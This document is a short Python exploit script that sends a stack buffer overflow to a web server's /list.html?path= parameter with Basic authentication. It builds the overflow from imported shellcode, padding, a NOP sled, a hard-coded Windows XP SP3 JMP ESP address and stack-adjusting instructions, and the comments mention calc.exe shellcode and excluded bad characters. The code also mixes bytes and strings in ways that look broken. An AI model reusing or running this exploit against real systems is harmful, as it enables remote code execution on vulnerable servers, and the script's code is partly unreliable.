#!/usr/bin/python

import socket
import sys
import time
import base64 as b64

from itsdangerous import base64_encode


from payload import buf

import struct
def shell_attack(target_machine, target_port): 
	buffer = buf
	target = target_machine
	port = target_port
	user = b"User"
	pwd = b"Password"

	auth = b64.b64encode(user+b":"+pwd)

	buffer+=b"A"*1963
	buffer+=b"\x90"*179

	# 165 bytes Calc.exe shellcode / badchars identified and excluded


	buffer+=b"\x90"*15

	# #[ XP SP2 ] -> "\x78\x16\xF3\x77"	#0x77F31678  JMP ESP
	# buf+="\x78\x16\xF3\x77"

	# [ XP SP3 ] -> "\x3F\x71\x49\x7E"   #0x7E49713F  JMP ESP
	buffer+=b"\x3F\x71\x49\x7E"

	buffer+=b"\x90"*30
	buffer+=b"\x66\x05\x7A\x03"      	#ADD AX,037A
	buffer+=b"\x66\x05\x7A\x03"      	#ADD AX,037A
	buffer+=b"\x66\x05\x7A\x03"      	#ADD AX,037A
	buffer+=b"\x50\xc3"             	#PUSH EAX + RET
	head = "GET /list.html?path="+str(buffer)+" HTTP/1.1 \r\n"
	head += "Host: \r\n"
	head += "Authorization: Basic "+str(auth)+"\r\n"
	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((target, port))
		s.send(head + "\r\n")
	
		s.close()
	except:
		pass